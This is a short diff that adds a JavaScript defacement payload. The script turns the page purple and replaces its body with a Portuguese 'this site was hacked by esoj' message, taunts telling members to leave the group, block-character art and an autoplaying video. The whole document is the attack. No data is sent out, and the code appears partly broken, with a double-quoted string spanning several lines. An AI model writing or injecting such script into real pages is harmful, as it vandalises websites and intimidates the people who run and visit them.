@@ -1,0 +1,23 @@
+<script>document.body.style.backgroundColor = "purple";document.body = document.body.innerHTML = "<h1>Este site foi hackeado pelo esoj</h1><br><video width=600 height=400 autoplay> <br>  <source src=a1.mp4 type=video/mp4></video>
+<br>🤡ÅŤÅQŮĘ ĐØ§ PÅHÅÇØ§ ĽØĶØ🤡    AGORA É NOIS QUE MANDA NESSA PORRA   <br>
+☣️☣️☣️👿  <br>
+🤡SAIAM DO GRUPO 🤡<br>   
+  <br>
+COMEÇOU O ATAQUE 🤡🤡🤡  <br>
+  <br>
+HÁ! HÁ! HÁ! HÁ! HÁ!<br>   
+  
+Ø§ ČØMËĐØŘË§ ĐË ÄĐMÎÑÎ§ŤŘÅĐØ 🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡  <br>
+  <br>
+▕▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇  <br>
+▕▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇  <br>
+▕▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇  <br>
+▕▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇  <br>
+▕▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇  <br>
+▕▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇  <br>
+▕▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇  <br>
+▕▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇  <br>
+  <br>
+🤡PÅHÅÇØ§ ØĶØ🤡<br>
+<br>
+Ta_Em_CHoK kk❓⚡️";</script>
